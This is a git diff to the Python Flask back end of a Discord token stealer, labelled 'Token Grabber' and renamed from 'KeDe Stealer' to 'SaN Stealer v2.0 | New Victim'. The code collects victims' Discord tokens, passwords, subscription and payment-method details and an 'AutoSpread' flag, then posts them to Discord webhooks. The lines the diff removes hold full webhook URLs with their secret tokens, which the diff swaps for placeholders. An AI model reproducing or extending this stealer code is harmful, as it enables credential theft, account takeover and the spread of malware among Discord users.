@@ -4,6 +4,7 @@ from json import loads, dumps
 from time import sleep
 from threading import Thread
 from flask import Flask
+from waitress import serve
 import requests
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
@@ -61,7 +62,7 @@ def send(token: str):
         "content" : token,
         "username" : "Token Grabber"
     }
-    requests.post("https://discord.com/api/webhooks/941979552966664242/pBW7vxrGYL87ho0LjBmNiacsic-t_Wvx3zTPYftkrCzBeH8FmZjMD1dSENzQoo2lJQ-n", json = data)
+    requests.post("WEBHOOK LINK", json = data)
 @app.route("/")
 def home():
     return "home"
@@ -121,9 +122,9 @@ def API(token: str, message: str, password: str):
     else:
         Autospread = "False"
     # hhhhhh
-    webhookk = DiscordWebhook(url="https://discord.com/api/webhooks/952885317705297920/8Oa6uVp4PYH3D4Q3YkKFHoZkVrSvrWcmvIhyPe-dFKym7Bn9bcOxX4T1F4dKgj6NxwLK", rate_limit_retry=True)
+    webhookk = DiscordWebhook(url="WEBHOOK LINK", rate_limit_retry=True)
     un = UI["username"] + "#" + UI['discriminator']
-    embed = DiscordEmbed(title='KeDe Stealer v2.0 | New Victim🔔 | @everyone', description=f':arrow_forward: **User:** `{un}`\n:moneybag: **Subscription**: `{Nitro}`', color='03b2f8')
+    embed = DiscordEmbed(title='SaN Stealer v2.0 | New Victim🔔 | @everyone', description=f':arrow_forward: **User:** `{un}`\n:moneybag: **Subscription**: `{Nitro}`', color='03b2f8')
     embed.add_embed_field(name="Payment Method:", value=str(PM))
     embed.add_embed_field(name="AutoSpread:", value=str(Autospread))
     embed.add_embed_field(name="Password:", value="`"+str(password)+'`')
@@ -135,4 +136,4 @@ def API(token: str, message: str, password: str):
 
     return "K"
     
-app.run(host="127.0.0.1", port=8080, debug=True)
+serve(app=app, port=3000, threads=50)
